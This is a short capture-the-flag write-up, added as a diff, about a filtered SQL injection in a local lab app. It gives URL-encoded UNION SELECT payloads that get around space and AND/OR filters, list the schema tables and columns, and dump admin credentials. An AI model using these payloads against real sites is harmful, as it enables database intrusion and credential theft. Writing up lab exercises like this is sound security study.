@@ -1,0 +1,32 @@
+Challenge 043 : Experienced Injection Challenge
+
+YOU're logged in a user and when u notice the url it's a GET request.. so we might some thing like sql injection seems easy.. 
+http://localhost:8008/inside/main_index.php?id=1' 
+getting a simple erroe on adding of ' at the end
+That means, for sure SQL injection is possible in this
+let's dig a bit deeper
+' -- -  doesnt works
+Spaces are Filtered :/
+Filters Filters everywhere.. Developer has worked out some !!
+
+http://localhost/sqli-labs/Less-26/?id=1'&&'1
+http://localhost/sqli-labs/Less-26/?id=1%27%A0union%A0all%A0select%A01,2,3%26%26%20%271
+http://localhost/sqli-labs/Less-26/?id=1777%27union%A0all%A0select%A01,2,3%26%26%271
+
+this was good.. actually.. spaces are filtered some  and also and and or.. so url encoding and any random character at that place and the query works
+
+http://localhost:8008/inside/main_index.php?id=777%27union%A0all%A0select%A01,database%28%29,group_concat%28table_name%29%A0from%A0information_schema.tables%A0where%A0table_schema=database%28%29%26%26%271
+
+http://localhost:8008/inside/main_index.php?id=777%27union%A0all%A0select%A01,group_concat%28table_name%29,3%A0from%A0information_schema.tables%A0where%A0table_schema=database%28%29%26%26%271
+gives : emails and users table
+
+
+http://localhost:8008/inside/main_index.php?id=777%27union%A0all%A0select%A01,group_concat%28column_name%29,3%A0from%A0information_schema.columns%A0where%A0table_name=%27users%27%26%26%271
+
+dump the admin username and password
+theadmin : theadmin123
+
+/robots.txt  :  gives u the admin page
+
+Successful !!
+Hope you enjoyed this challenge !!!
